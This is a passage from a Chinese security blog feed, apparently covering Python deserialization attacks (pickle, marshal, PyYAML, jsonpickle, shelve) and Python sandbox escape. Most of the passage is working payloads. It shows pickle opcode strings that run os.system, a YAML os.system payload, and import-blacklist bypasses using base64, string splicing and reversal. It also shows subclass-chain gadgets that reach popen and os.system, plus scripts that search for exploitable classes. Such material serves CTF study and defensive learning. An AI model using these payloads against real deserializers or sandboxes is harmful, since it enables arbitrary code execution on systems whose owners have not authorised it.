b&quot;&quot;&quot;cbuiltinsgetattr(cbuiltinsgetattr(cbuiltinsdictS&#39;get&#39;tR(cbuiltinsglobals(tRS&#39;builtins&#39;tRS&#39;eval&#39;tRp1(S&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;tR.&quot;&quot;&quot;restricted_loads(s)</code></pre><p>到此为了对了黑名单过滤的方法已经取得了部分胜利，opcode不止这些还有很多没用到。</p><p>执行函数的并不只是R，还有O和I，都是小写，比如获取<code>get</code>。</p><pre><code>#使用o，使用第一个参数作为函数，第二到n个元素作为参数b&quot;&quot;&quot;(cbuiltinsgetattrcbuiltinsdictS&#39;get&#39;o.&quot;&quot;&quot;#使用i,先获取全局函数，在计算mark之后的数据组合为元组作为参数b&quot;&quot;&quot;(cbuiltinsdictS&#39;get&#39;ibuiltinsgetattr.&quot;&quot;&quot;</code></pre><p>如果不想什么都去手写，或者也不是很熟练，可以参考</p><p><a href="https://github.com/sensepost/anapickle/blob/master/anapickle.py" target="_blank" rel="noopener">https://github.com/sensepost/anapickle/blob/master/anapickle.py</a></p><p>其中列出来不少完善的opcode，只需要按照提示修改其中的关键词，就可以使用，只不过这个脚本是利用python2，其中有些函数已经在python3下取消了，需要查看修改。</p><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h3 id="Marshal"><a href="#Marshal" class="headerlink" title="Marshal"></a>Marshal</h3><p>上面扯了半天的<code>pickle</code>，那么现在看看还有啥别的序列化库吧。由于<code>pickle</code>不能序列化code对象，所以在python2.6后新增<code>marshal</code>来处理code对象的序列化。</p><pre><code>#coding:utf-8import pickle,builtins,pickletools,base64import marshalimport urllibdef foo():    import os    def fib(n):        if n &lt;= 2:            return n        return fib(n-1) + fib(n-2)    print (fib(5))try:    pickle.dumps(foo.__code__)except Exception as e:    print(e)code_serialized = base64.b64encode(marshal.dumps(foo.__code__))print (code_serialized)</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200429162508587.png" alt="image-20200429162508587"></p><p>如何去反序列化并且执行函数。</p><pre><code>code_unserialized = marshal.loads(base64.b64decode(code_serialized))print(code_unserialized)&lt;code object foo at 0x000001E232E27AE0, file &quot;E:/poc.py&quot;, line 7&gt;</code></pre><pre><code>code_unserialized = types.FunctionType(code_unserialized, globals(), &#39;&#39;)()print(code_unserialized)8None</code></pre><p>这样就可以之间获取一个opcode。</p><pre><code>ctypesFunctionType(cmarshalloads(cbase64b64decode(S&#39;YwAAA...&#39;           #code对象序列化编码tRtRc__builtin__globals(tRS&#39;&#39;tR(tR.</code></pre><p>组合脚本</p><pre><code>import marshalimport base64def foo():    pass # Your code hereprint &quot;&quot;&quot;ctypesFunctionType(cmarshalloads(cbase64b64decode(S&#39;%s&#39;tRtRc__builtin__globals(tRS&#39;&#39;tR(tR.&quot;&quot;&quot; % base64.b64encode(marshal.dumps(foo.func_code))</code></pre><p>利用上面的序列化在<code>pickle</code>下尝试执行，调用os模块来执行其中的函数。</p><pre><code>def foo():    import os    return os.system(&#39;whoami&#39;)code_serialized = base64.b64encode(marshal.dumps(foo()))print (code_serialized)payload = b&quot;&quot;&quot;ctypesFunctionType(cmarshalloads(cbase64b64decode(S&#39;6QAAAAA=&#39;   #whomaitRtRc__builtin__globals(tRS&#39;&#39;tR(tR.&quot;&quot;&quot;data = pickle.loads(payload)print(data)</code></pre><p>于是又有一个黑名单绕过执行函数的方式。</p><h3 id="PyYAML"><a href="#PyYAML" class="headerlink" title="PyYAML"></a>PyYAML</h3><p>yaml和xml、json等类似，都是标记类语言，有自己的语法格式。各个支持yaml格式的语言都会有自己的实现来进行yaml格式的解析（读取和保存），其中PyYAML就是python的一个yaml库。</p><p>除了 YAML 格式中常规的列表、字典和字符串整形等类型转化外（基本数据类型），各个语言的 YAML 解析器或多或少都会针对其语言实现一套特殊的<strong>对象转化规则</strong>（也就是序列化和反序列化，这是关键点，是这个漏洞存在的前提)。</p><p>使用了<code>yaml.load</code>而不是<code>yaml.safe_load</code>函数来解析yaml文件的程序，<code>yaml.load</code>和<code>pickle.load</code>具有一样的功能，可以调用所有python函数。</p><p><code>yaml.load</code> 函数的作用是用来将YAML文档转化成Python对象。</p><pre><code>&gt;&gt;&gt; yaml.load(&quot;&quot;&quot;- 111&quot;&quot;&quot;)[111]&gt;&gt;&gt; yaml.load(&quot;&quot;&quot;111&quot;&quot;&quot;)111</code></pre><p>如果字符串或者文件中包含多个YAML文档，那么可以使用 <code>yaml.load_all</code> 函数将它们全部反序列化</p><pre><code>&gt;&gt;&gt; cp = &quot;&quot;&quot;... aaaa... ---... bbbb... ---... cccc... &quot;&quot;&quot;&gt;&gt;&gt; yaml.load_all(cp)&lt;generator object load_all at 0x0000026FBEBDD390&gt;&gt;&gt;&gt; for i in yaml.load_all(cp):...     print(i)...aaaabbbbcccc</code></pre><p>yaml标签和python对象的关系，部分关系，详细<a href="https://pyyaml.org/wiki/PyYAMLDocumentation" target="_blank" rel="noopener">https://pyyaml.org/wiki/PyYAMLDocumentation</a></p><pre><code>!!str    str或unicode!!map    dict!!python/str    str!!python/dict    dict!!python/name:module.name    module.name!!python/module:package.module    package.module!!python/object:module.cls    module.cls !!python/object/new:module.cls    module.cls !!python/object/apply:module.f    </code></pre><p>可以使用<code>!!python/object</code>序列化任意对象。</p><pre><code>!!python/object:module.Class { attribute: value, ... }</code></pre><p>为了支持pickle协议，提供了两种附加形式的<code>!!python/object</code>标签</p><pre><code>!!python/object/new:module.Classargs: [argument, ...]kwds: {key: value, ...}state: ...listitems: [item, ...]dictitems: [key: value, ...]!!python/object/apply:module.functionargs: [argument, ...]kwds: {key: value, ...}state: ...listitems: [item, ...]dictitems: [key: value, ...]</code></pre><p>构造一个序列化，dump的结果就是上面的标签形式。</p><pre><code>#coding:utf-8import yaml,osclass test:    def __init__(self):        os.system(&#39;whoami&#39;)payload = yaml.dump(test())print(payload)yaml.load(payload)#misaki\user#!!python/object:__main__.test {}</code></pre><p>直接发送一个序列化值</p><pre><code>cp = &quot;&quot;&quot;!!python/object/apply:os.system [&#39;whoami&#39;]&quot;&quot;&quot;#cp = &quot;&quot;&quot;!!python/object/new:os.system [&#39;whoami&#39;]&quot;&quot;&quot;yaml.load(cp)#misaki\user</code></pre><p>不过此处并不能直接使用<code>!!python/object:</code>，因为它接收的是一个dict类型的对象属性。并不接收args的列表参数。当调用<code>yaml.load</code>的时候是使用<code>!!python/object</code>来处理。</p><p>避免此问题可以使用<code>safe_load</code>来替换<code>load</code>，该函数<code>yaml.safe_load</code>将此功能限制为简单的Python对象（例如整数或列表）。</p><pre><code>cp = &quot;&quot;&quot;!!python/object/apply:os.system [&#39;whoami&#39;]&quot;&quot;&quot;yaml.safe_load(cp)#yaml.constructor.ConstructorError: could not determine a constructor for the tag</code></pre><h3 id="Jsonpickle"><a href="#Jsonpickle" class="headerlink" title="Jsonpickle"></a>Jsonpickle</h3><p>用于将任意对象序列化为JSON的Python库。<code>Jsonpickle</code>可以使用几乎所有Python对象并将该对象转换为JSON。另外，它可以将对象重新构造回Python。该对象必须可以通过模块进行全局访问，并且必须继承自对象（又称新类）。<a href="https://jsonpickle.github.io/#module-jsonpickle" target="_blank" rel="noopener">https://jsonpickle.github.io/#module-jsonpickle</a></p><p>创建一个对象：</p><pre><code>class Thing(object):    def __init__(self, name):        self.name = nameobj = Thing(&#39;Awesome&#39;)</code></pre><p>使用<code>Jsonpickle</code>将对象转换为JSON字符串：</p><pre><code>import jsonpicklefrozen = jsonpickle.encode(obj)</code></pre><p>使用<code>Jsonpickle</code>从JSON字符串重新创建Python对象：</p><pre><code>thawed = jsonpickle.decode(frozen)</code></pre><p>如果使用跟原pickle相似的利用方式</p><pre><code>&gt;&gt;&gt; class Thing(object):...     def __init__(self, name):...         os.system(&#39;whoami&#39;)...&gt;&gt;&gt; obj = Thing(&#39;Awesome&#39;)misaki\user</code></pre><h3 id="Shelve"><a href="#Shelve" class="headerlink" title="Shelve"></a>Shelve</h3><p>shelve用处是让对象持久化，但它在序列化与反序列化的过程中使用了pickle模块，因此我们可以利用shelve会调用的pickle在反序列化过程中执行代码。</p><pre><code>import shelveimport osclass exp(object):    def __reduce__(self):        return (os.system(&#39;ls&#39;))file = shelve.open(&quot;test&quot;)file[&#39;exp&#39;] = exp()</code></pre><p>文章参考：<a href="https://xz.aliyun.com/t/2289" target="_blank" rel="noopener">Python反序列化漏洞的花式利用</a>，<a href="https://xz.aliyun.com/t/7436" target="_blank" rel="noopener">pickle反序列化初探</a>，<a href="http://www.polaris-lab.com/index.php/archives/178/" target="_blank" rel="noopener">Python Pickle的任意代码执行漏洞实践和Payload构造</a>，<a href="https://segmentfault.com/a/1190000013099825" target="_blank" rel="noopener">Python反序列化安全问题</a>，<a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html" target="_blank" rel="noopener">Code-Breaking中的两个Python沙箱</a>，<a href="https://checkoway.net/musings/pickle/" target="_blank" rel="noopener">Arbitrary code execution with Python pickles</a>，<a href="http://www.polaris-lab.com/index.php/archives/375/" target="_blank" rel="noopener">Python PyYAML反序列化漏洞实验和Payload构造</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;反序列化库&quot;&gt;&lt;a href=&quot;#反序列化库&quot; class=&quot;headerlink&quot; title=&quot;反序列化库&quot;&gt;&lt;/a&gt;反序列化库&lt;/h2&gt;&lt;p&gt;python 序列化和反序列化使用最为频繁的是&lt;code&gt;cPickle&lt;/code&gt;和&lt;code&gt;pickle&lt;/
      
    
    </summary>
    
    
      <category term="python" scheme="/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python 沙箱逃逸与SSTI</title>
    <link href="/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/"/>
    <id>/2020/04/python-沙箱逃逸与SSTI/</id>
    <published>2020-04-21T01:11:03.000Z</published>
    <updated>2020-04-24T07:38:48.715Z</updated>
    
    <content type="html"><![CDATA[<h2 id="沙箱逃逸概述"><a href="#沙箱逃逸概述" class="headerlink" title="沙箱逃逸概述"></a>沙箱逃逸概述</h2><p>沙箱逃逸就是在在一个严格限制的python环境中，通过绕过限制和过滤达到执行更高权限，甚至getshell的过程。</p><p>既然是想getshell，或者说是执行命令就需要一个可执行命令的包。可直接执行命令的模块有</p><pre><code>osptysubprocessplarformcommands</code></pre><p>有些时候，比如CTF，我们并不需要去执行命令，而是去读取目录下的flag文件即可，也就是说需要文件读取的模块来执行，常用的文件读取模块：</p><pre><code>fileopencodecsfileinput</code></pre><p>不过其中file只在python2中执行，左2右3。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150419.png" alt="image-20200421092433264"></p><h2 id="函数导入限制和绕过"><a href="#函数导入限制和绕过" class="headerlink" title="函数导入限制和绕过"></a>函数导入限制和绕过</h2><h3 id="import"><a href="#import" class="headerlink" title="import"></a>import</h3><p>一个受限制的环境，禁止导入敏感的包是最常见的方法，所以import一般是最容易被限制掉。</p><pre><code>import re,syspattern  = re.compile(&#39;import\s+(os|subprocess)&#39;)match = re.search(pattern,sys.args[1])if match:    print &quot;forbidden module import detected&quot;    raise Exception</code></pre><p>这种简单的限制不能导入包的形式，可以中间添加空格来绕过，或者使用其他方式导入包，比如</p><pre><code>__import__importlib</code></pre><p>还可以使用编码的方式绕过对导入包关键字的检查，比如使用base64，python2中适用</p><pre><code>&gt;&gt;&gt; import base64&gt;&gt;&gt; base64.b64encode(&quot;os&quot;)&#39;b3M=&#39;&gt;&gt;&gt; flag = __import__(base64.b64decode(&#39;b3M=&#39;))&gt;&gt;&gt; flag.system(&#39;whoami&#39;)misaki\user&gt;&gt;&gt; import importlib&gt;&gt;&gt; flag = importlib.import_module(&#39;b3M=&#39;.decode(&#39;base64&#39;))&gt;&gt;&gt; flag.system(&#39;whoami&#39;)misaki\user</code></pre><p>或者使用字符串拼接的方式</p><pre><code>&gt;&gt;&gt; __import__(&#39;o&#39;+&#39;s&#39;).system(&#39;who&#39;+&#39;ami&#39;)</code></pre><p>字符串f翻转截取</p><pre><code>&gt;&gt;&gt; __import__(&#39;so&#39;[::-1]).system(&#39;whoami&#39;)misaki\user&gt;&gt;&gt; exec(&#39;)&quot;imaohw&quot;(metsys.so ;so tropmi&#39;[::-1])misaki\user</code></pre><p>再万一，他是这么禁止的</p><pre><code>import re,syspattern  = re.compile(&#39;import&#39;)match = re.search(pattern,sys.args[1])if match:    print &quot;forbidden module import detected&quot;    raise Exception</code></pre><p>这样的话，不管怎么换导入函数都会被禁止。那么是否有不直接使用import关键字来导入的方式。既然需要导入也就是只需要能执行对应的库就可以。</p><p>使用execfile，不过在这之前需要判断得到库的物理路径。如果sys模块没被禁用的话，就可以使用sys来获取物理路径。这种方式只能用在python2中，python3取消了execfile</p><pre><code>&gt;&gt;&gt; execfile(&#39;/usr/lib/python2.7/os.py&#39;)  #Linux系统下默认路径&gt;&gt;&gt; system(&#39;whoami&#39;)misaki</code></pre><p>python3可以利用读取文件，配合exec来执行</p><pre><code>&gt;&gt;&gt; f = open(r&#39;/usr/lib/python3.6/os.py&#39;,&#39;r&#39;)&gt;&gt;&gt; exec(f.read())&gt;&gt;&gt; system(&#39;whoami&#39;)misaki#不可以执行利用exec打开读取，exec需要执行的是其中的内容，直接打开的时候exec执行的就是读取文件操作exec(&quot;open(&#39;/usr/lib/python3.6/os.py&#39;,&#39;r&#39;).read()&quot;)</code></pre><p>使用with open的形式</p><pre><code>&gt;&gt;&gt; with open(&#39;/usr/lib/python3.6/os.py&#39;,&#39;r&#39;) as f:...     exec(f.read())...&gt;&gt;&gt; system(&#39;whoami&#39;)misaki</code></pre><p>或者使用字符串拼接的方式，但是需要跟exec，eval一起利用。</p><pre><code>&gt;&gt;&gt; exec(&#39;imp&#39;+&#39;ort&#39;+&#39; &#39;+&#39;os;&#39;+&#39;os.system(&quot;whoami&quot;)&#39;)misaki\user</code></pre><p>这里exec不需要导入就可以直接引用，当然不需要导入就可以引用的函数不止这一个，因为一个内建函数的原因。</p><h3 id="builtins"><a href="#builtins" class="headerlink" title="__builtins__"></a>__builtins__</h3><p>__builtins__即时引用，在程序还为执行代码的时候就已经加载进来了。此模块并不需要导入，可以在任何模块中执行引用。比如在python2中</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150423.png" alt="image-20200421095142948"></p><p>在python3中</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150425.png" alt="image-20200421095205061"></p><p>所以我们通过dict属性来调用这些函数，例如如下调用exec来执行其中的python语句。</p><pre><code>&gt;&gt;&gt; __builtins__.__dict__[&#39;exec&#39;](&quot;print(&#39;ok&#39;)&quot;)ok</code></pre><p>通过内建函数来导入包</p><pre><code>&gt;&gt;&gt; __builtins__.__dict__[&#39;__import__&#39;](&#39;os&#39;).system(&#39;whoami&#39;)misaki\user</code></pre><p>万一跟上面一样，禁用了import，当然还可以使用拼接的方式</p><pre><code>&gt;&gt;&gt; __builtins__.__dict__[&#39;__imp&#39;+&#39;ort__&#39;](&#39;os&#39;).system(&#39;whoami&#39;)misaki\user</code></pre><p>如果在__builtins__中，部分需要引用的函数被删除。不能直接用dict属性来调用，可以使用reload来重新加载</p><pre><code>reload(__builtin__)</code></pre><p>如果仔细看上面的图片就可以看到，在python2中reload也是__builtin__的内建函数。如果此函数被删除在python2中也不可以直接引用了。python3中reload不再是内建函数，3.4之前是imp模块下的函数，而之后是importlib模块下的函数。</p><p>所以可以直接利用imp模块来导入，python2也可以利用。</p><pre><code>&gt;&gt;&gt; import imp&gt;&gt;&gt; imp.reload(__builtins__)&lt;module &#39;__builtin__&#39; (built-in)&gt;</code></pre><p>在所上的导入模块中，系统的包都在一个默认路径下，被sys的modules存储记录。如果把其中的os模块删除就不能再去加载os模块了，这时候需要手动把os重新加载进去。一般尝试默认路径，或者sys查看存储路径</p><pre><code>&gt;&gt;&gt; import sys&gt;&gt;&gt; sys.modules[&#39;os&#39;]=&#39;/usr/lib/python3.6/os.py&#39;&gt;&gt;&gt; import os&gt;&gt;&gt;</code></pre><h2 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h2><p>python沙箱逃逸还是离不开继承关系和子父类关系，在查看和使用类的继承，魔法函数起到了不可比拟的作用。</p><p>先看看几个常用的魔法函数</p><pre><code>__class__返回调用的类型class A():    passa = A()print(a.__class__)  #&lt;class &#39;__main__.A&#39;&gt;</code></pre><pre><code>__mro__查看类继承的所有父类，直到objectclass A:    passclass B(A):    passclass C(A):    passclass D(B, C):    passprint(D.__mro__) #(&lt;class &#39;__main__.D&#39;&gt;, &lt;class &#39;__main__.B&#39;&gt;, &lt;class &#39;__main__.C&#39;&gt;, &lt;class &#39;__main__.A&#39;&gt;, &lt;class &#39;object&#39;&gt;)</code></pre><pre><code>__subclasses__获取类的所有子类class A(object):    passclass B(A):    passclass C(A):    passprint(A.__subclasses__()) #[&lt;class &#39;__main__.B&#39;&gt;, &lt;class &#39;__main__.C&#39;&gt;]</code></pre><pre><code>__bases__返回所有直接父类组成的元组class A(object):    passclass B(A):    passprint(B.__bases__)  #(&lt;class &#39;__main__.A&#39;&gt;,)  不返回object类</code></pre><pre><code>__init__类实例创建之后调用, 对当前对象的实例的一些初始化class A:    def __init__(self):        print(&#39;ok&#39;)a = A()  # 输出ok</code></pre><pre><code>__globals__能够返回函数所在模块命名空间的所有变量class A(object):    def __init__(self, a, b):        self.a = a        self.b = ba.__init__.__globals__{&#39;A&#39;: &lt;class &#39;__main__.A&#39;&gt;, &#39;a&#39;: &lt;__main__.A object at 0x0000000001692390&gt;, &#39;importlib&#39;: &lt;module &#39;importlib&#39; from &#39;D:\anaconda\lib\importlib\__init__.pyc&#39;&gt;, &#39;__builtins__&#39;: &lt;module &#39;__builtin__&#39; (built-in)&gt;, &#39;pattern&#39;: &lt;_sre.SRE_Pattern object at 0x0000000001695030&gt;, &#39;base64&#39;: &lt;module &#39;base64&#39; from &#39;D:\anaconda\lib\base64.pyc&#39;&gt;, &#39;sys&#39;: &lt;module &#39;sys&#39; (built-in)&gt;, &#39;flag&#39;: &lt;module &#39;os&#39; from &#39;D:\anaconda\lib\os.pyc&#39;&gt;, &#39;__package__&#39;: None, &#39;os&#39;: &lt;module &#39;os&#39; from &#39;D:\anaconda\lib\os.pyc&#39;&gt;, &#39;__doc__&#39;: None, &#39;match&#39;: &lt;_sre.SRE_Match object at 0x00000000039A9B28&gt;}</code></pre><pre><code>__getattribute__当类被调用的时候，无条件进入此函数。__getattr__对象中不存在的属性时调用class A:    def __init__(self):        self.name = &quot;Bob&quot;    def __getattribute__(self,item):        print(&quot;ok&quot;)a = A()  a.name   #ok, 这时候不管调用什么属性都会返回ok，相当于拦截了属性调用。    def __getattr__(self):        print(&#39;getattr&#39;)a.age   #getattr  调用不存在的属性会执行，相当于处理了AttributeError。</code></pre><h3 id="类继承使用"><a href="#类继承使用" class="headerlink" title="类继承使用"></a>类继承使用</h3><p>尝试利用继承关系来找到object类</p><pre><code>&quot;&quot;.__class__.__bases__   #(&lt;class &#39;object&#39;&gt;,)</code></pre><p>前面不仅可以使用双引号，还可以利用列表或者字典类型，区别在查找类型的时候在不同的基础上查找，返回都是元组。</p><pre><code>[].__class__.__bases__{}.__class__.__bases__</code></pre><p>在object类下去查找所有的子类，然后去查找可利用类，__bases__返回是元组，使用下标获得object类。</p><pre><code>&quot;&quot;.__class__.__bases__[0].__subclasses__()</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150429.png" alt="image-20200421145832381"></p><p>找到需要使用的类，其中有可以使用的类，在python3中使用</p><pre><code>&lt;class &#39;os._wrap_close&#39;&gt;,&lt;class &#39;warnings.WarningMessage&#39;&gt;</code></pre><p>调用他们</p><pre><code>&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[128]&lt;class &#39;os._wrap_close&#39;&gt;&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[177]&lt;class &#39;warnings.WarningMessage&#39;&gt;</code></pre><p>如果子类过多，不好查找是第几个下标，可以使用如下来标记</p><pre><code>for i in enumerate(&quot;&quot;.__class__.__bases__[0].__subclasses__()):     print i</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150432.png" alt="image-20200421150812786"></p><p>先来读取一下文件，C盘下的win.ini文件</p><pre><code>&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150434.png" alt="image-20200421162023248"></p><p>从中查找是否有关于文件读取的方法，比如open，file函数。在最后找到一个popen函数。</p><pre><code>&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#39;popen&#39;](&quot;C:\\windows\\win.ini&quot;).read()</code></pre><p>如果想直接在终端显示出来</p><pre><code>&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#39;popen&#39;](&quot;type C:\\windows\\win.ini&quot;).read()</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150436.png" alt="image-20200423141850480"></p><p>在python2中可以使用如下形式读取文件的第一行，在python2中前面是否字符串还是元组或者字典对后面类的查找有不一样的结果。</p><pre><code>().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].getline(&quot;C:\\windows\\win.ini&quot;,1)</code></pre><p>执行命令</p><pre><code>&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].os.system(&#39;whoami&#39;)misaki\user</code></pre><p>但是python2如果使用字符串的形式，会报如下错误，因为<code>__bases__</code>获取的并不是object类</p><pre><code>&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[59]Traceback (most recent call last):  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;IndexError: list index out of range</code></pre><p>只需要再去获得一次即可</p><pre><code>&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__bases__[0].__subclasses__()[59]&lt;class &#39;warnings.WarningMessage&#39;&gt;</code></pre><h2 id="特殊函数查找"><a href="#特殊函数查找" class="headerlink" title="特殊函数查找"></a>特殊函数查找</h2><h3 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h3><p>在GitHub的python页面上把自带函数全部获取目前的3.8的模块(202)</p><pre><code>asynciocollectionsconcurrentctypescursesdbmdistutilsemailencodings......warnings.pywave.pyweakref.pywebbrowser.pyxdrlib.pyzipapp.pyzipfile.pyzipimport.py</code></pre><p>将这么模块进行筛选，规则这些模块哪些有调用上面提到的模块，或者文件读取等方法。</p><pre><code># coding=UTF-8import codecsfrom collections import defaultdictwith codecs.open(&#39;python.txt&#39;, &#39;r&#39;, encoding=&#39;UTF-8&#39;) as f:    modules = f.readlines()modules = [m.strip().replace(&#39;.py&#39;, &#39;&#39;) for m in modules]target_modules = [&#39;os&#39;, &#39;platform&#39;, &#39;subprocess&#39;, &#39;timeit&#39;, &#39;importlib&#39;, &#39;codecs&#39;, &#39;sys&#39;, &#39;commands&#39;]target_functions = [&#39;__import__&#39;, &#39;__builtins__&#39;, &#39;exec&#39;, &#39;eval&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;file&#39;, &#39;open&#39;, &#39;codecs&#39;]all_targets = target_modules + target_functionsresults = defaultdict(list)for m in modules:    try:        module = __import__(m)    except Exception as e:        # print(&#39;ERROR:&#39;, m)        pass    for t in all_targets:        if t in module.__dict__:            results[m.encode()].append(t)print(&quot;可利用模块数量为:&quot;+str(len(results)))for k, v in results.items():    print(k, v)</code></pre><p>筛选完成后有python3两百个模块可能可以利用，然后再利用脚本进一步筛选</p><pre><code>find_modules = {    }target_modules = [&#39;os&#39;, &#39;platform&#39;, &#39;subprocess&#39;, &#39;timeit&#39;, &#39;importlib&#39;, &#39;codecs&#39;, &#39;sys&#39;]target_functions = [&#39;__import__&#39;, &#39;__builtins__&#39;, &#39;exec&#39;, &#39;eval&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;file&#39;, &#39;open&#39;]all_targets = list(set(list(find_modules.keys()) + target_modules + target_functions))all_modules = list(set(list(find_modules.keys()) + target_modules))subclasses = ().__class__.__bases__[0].__subclasses__()sub_name = [s.__name__ for s in subclasses]# 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40](&#39;./test.py&#39;).read()print(&#39;----------1-----------&#39;)for i, s in enumerate(sub_name):    for f in all_targets:        if f == s:            if f in target_functions:                print(i, f)            elif f in all_modules:                target = find_modules[f]                sub_dict = subclasses[i].__dict__                for t in target:                    if t in sub_dict:                        print(i, f, target)print(&#39;----------2-----------&#39;)# 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;sy&#39;+&#39;stem&#39;](&#39;ls&#39;)for i, sub in enumerate(subclasses):    try:        more = sub.__init__.__globals__        for m in all_targets:            if m in more:                print(i, sub, m, find_modules.get(m))    except Exception as e:        passprint(&#39;----------3-----------&#39;)# 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.values()[13][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)for i, sub in enumerate(subclasses):    try:        more = sub.__init__.__globals__.values()        for j, v in enumerate(more):            for f in all_targets:                try:                    if f in v:                        if f in target_functions:                            print(i, j, sub, f)                        elif f in all_modules:                            target = find_modules.get(f)                            sub_dict = v[f].__dict__                            for t in target:                                if t in sub_dict:                                    print(i, j, sub, f, target)                except Exception as e:                    pass    except Exception as e:        passprint(&#39;----------4-----------&#39;)# 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__[&#39;__import__&#39;](&quot;os&quot;).system(&quot;ls&quot;)# &lt;class &#39;warnings.catch_warnings&#39;&gt;类很特殊，在内部定义了_module=sys.modules[&#39;warnings&#39;]，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似for i, sub in enumerate(subclasses):    try:        more = sub()._module.__builtins__        for f in all_targets:            if f in more:                print(i, f)    except Exception as e:        pass</code></pre><pre><code>----------2-----------75 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; __builtins__ None75 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; __import__ None75 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; sys None76 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; __builtins__ None76 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; __import__ None76 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; sys None77 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; __builtins__ None77 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; __import__ None77 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; sys None78 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; __builtins__ None78 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; __import__ None78 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; sys None79 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; __builtins__ None79 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; __import__ None79 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; sys None91 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; __builtins__ None91 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; sys None92 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; __builtins__ None92 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; sys None93 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; __builtins__ None93 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; sys None95 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; __builtins__ None95 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; sys None103 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; __builtins__ None103 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; sys None103 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open None104 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; __builtins__ None104 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; sys None104 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open None105 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; __builtins__ None105 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; sys None105 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open None106 &lt;class &#39;codecs.StreamRecoder&#39;&gt; __builtins__ None106 &lt;class &#39;codecs.StreamRecoder&#39;&gt; sys None106 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open None128 &lt;class &#39;os._wrap_close&#39;&gt; __builtins__ None128 &lt;class &#39;os._wrap_close&#39;&gt; sys None128 &lt;class &#39;os._wrap_close&#39;&gt; open None129 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; __builtins__ None129 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; sys None130 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; __builtins__ None130 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; sys None137 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; __builtins__ None138 &lt;class &#39;types._GeneratorWrapper&#39;&gt; __builtins__ None139 &lt;class &#39;warnings.WarningMessage&#39;&gt; 